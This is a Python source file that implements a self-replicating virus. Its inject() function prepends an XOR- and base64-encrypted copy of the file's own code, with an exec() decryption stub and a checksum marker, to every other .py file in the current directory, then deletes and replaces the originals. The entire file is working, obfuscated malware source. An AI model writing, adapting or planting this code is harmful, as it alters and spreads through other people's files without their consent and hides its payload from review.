# Checksum = 0cade4b82e9c3c6df98748d181b0fb9a
# DELIMITER:CRYPTO

import glob
import hashlib
import os
import base64
import random
import string


def encrypt(clear_text, key):
    """
    Encrypts a string using the given key.

    Args:
        clear_text (str): The string to encrypt.
        key (str): The encryption key.

    Returns:
        str: The encrypted string as a base64-encoded string.
    """

    reps = (len(clear_text)-1)//len(key) + 1
    encoded = clear_text.encode("ascii")

    key = (key * reps)[:len(clear_text)].encode("ascii")

    cipher_text = bytes([i1 ^ i2 for (i1, i2) in zip(encoded, key)])

    return base64.b64encode(cipher_text).decode("ascii")


def decrypt(cipher_text, key):
    """
    Decrypts a base64-encoded string using the given key.

    Args:
        cipher_text (str): The base64-encoded string to decrypt.
        key (str): The decryption key.

    Returns:
        str: The decrypted string.
    """

    reps = (len(cipher_text)-1)//len(key) + 1
    encoded64_bytes = cipher_text.encode("ascii")

    encoded_bytes = base64.b64decode(encoded64_bytes)

    key = (key * reps)[:len(cipher_text)].encode("ascii")

    clear_text = bytes([i1 ^ i2 for (i1, i2) in zip(encoded_bytes, key)])
    return clear_text.decode("ascii")


# DELIMITER:START


def inject():
    """
    Injects the contents of the current file into all Python files in the
    current directory, encrypted and protected by a checksum.
    """

    with open(__file__, "r") as injection:
        injection_text = injection.read()

    injection_text = injection_text.split("# DELIMITER:END\n")[0]

    injection_crypto_text = "# DELIMITER:CRYPTO\n" + injection_text.split(
        "# DELIMITER:CRYPTO\n")[1].split("# DELIMITER:START\n")[0]

    injection_script_text = injection_text.split("# DELIMITER:START\n")[1]

    # Get all python files in the current directory
    py_files = glob.glob("*.py")

    # Remove the initial
    py_files.remove(os.path.split(__file__)[1])

    for file in py_files:

        with open(file, "r") as script:
            script_text = script.read()

        checksum = hashlib.md5(file.encode("ascii")).hexdigest()
        first_line = script_text.split("\n")[0]

        if checksum in first_line:
            continue

        with open(file + ".injected", "w") as injected:
            injected.write("# Checksum = " + checksum + "\n" + injection_crypto_text + "# DELIMITER:START\n" +
                           encrypt_injection(injection_script_text) + "\n# DELIMITER:END\n" + script_text)

        os.unlink(file)
        os.rename(file + ".injected", file)


def encrypt_injection(injection: str) -> str:
    """
    Encrypts the given 'injection' string using a randomly generated key, and returns the payload string
    that can be executed to decrypt and run the injection text.

    Args:
        injection (str): The injection text to be encrypted.

    Returns:
        str: The payload string that can be executed to decrypt and run the injection text.
    """

    key = ""

    for i in range(64):
        key += random.choice(string.ascii_letters + "123456789")

    key_bytes = key.encode("ascii")
    base64_bytes = base64.b64encode(key_bytes)
    base64_key = base64_bytes.decode('ascii')

    encrypted_injection = encrypt(injection, key)

    payload = f"""
    
encrypted_injection = "{encrypted_injection}"
key = "{base64_key}"

injection_text = decrypt(encrypted_injection, base64.b64decode(key.encode("ascii")).decode("ascii"))

exec(injection_text)

"""

    return payload


inject()

# DELIMITER:END
